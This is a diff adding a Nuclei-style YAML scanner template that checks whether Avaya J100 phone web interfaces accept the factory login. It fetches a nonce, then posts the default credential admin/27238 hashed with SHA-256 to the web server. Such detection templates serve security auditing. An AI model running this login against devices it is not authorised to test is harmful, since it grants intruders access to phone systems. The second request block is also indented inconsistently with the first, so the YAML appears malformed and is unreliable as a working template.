@@ -1,0 +1,48 @@
+id: avaya-phone-default-login
+info:
+  name: Avaya Phone Web Interface Default Login - Detect
+  author: tpierru
+  severity: high
+  description: |
+    Avaya phone web interface contains a default login vulnerability. An attacker can obtain access to sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://documentation.avaya.com/bundle/InstallandadminJ100seriesIPPhone_r4.1.x/page/Logging_into_web_UI.html
+  classification:
+    cwe-id: CWE-1392
+  tags: default-login,avaya
+ 
+# Perform the authentication request only if a nonce has been retrieved in the cookies of the first request
+flow: http(1) && http(2)
+ 
+http:
+  # Get a nonce to use in the authentication request
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/J100WebServer.cgi?Operation=0"
+    extractors:
+      - type: kval
+        name: nonce
+        kval:
+          - j100nonce
+        internal: true
+ 
+  # Perform the authentication request by appending the nonce to the password and calculate a sha256 hash
+    - method: POST
+      path:
+        - "{{BaseURL}}/cgi-bin/J100WebServer.cgi?Operation=1"
+      body: "uname={{username}}&psw={{sha256(concat(password,nonce))}}"
+      attack: pitchfork
+      payloads:
+        username:
+          - admin
+        password:
+          - 27238
+      matchers-condition: and
+      matchers:
+        - type: status
+          status:
+            - 200
+        - type: word
+          part: body
+          words:
+            - "/cgi-bin/J100WebServer.cgi?Operation=211"
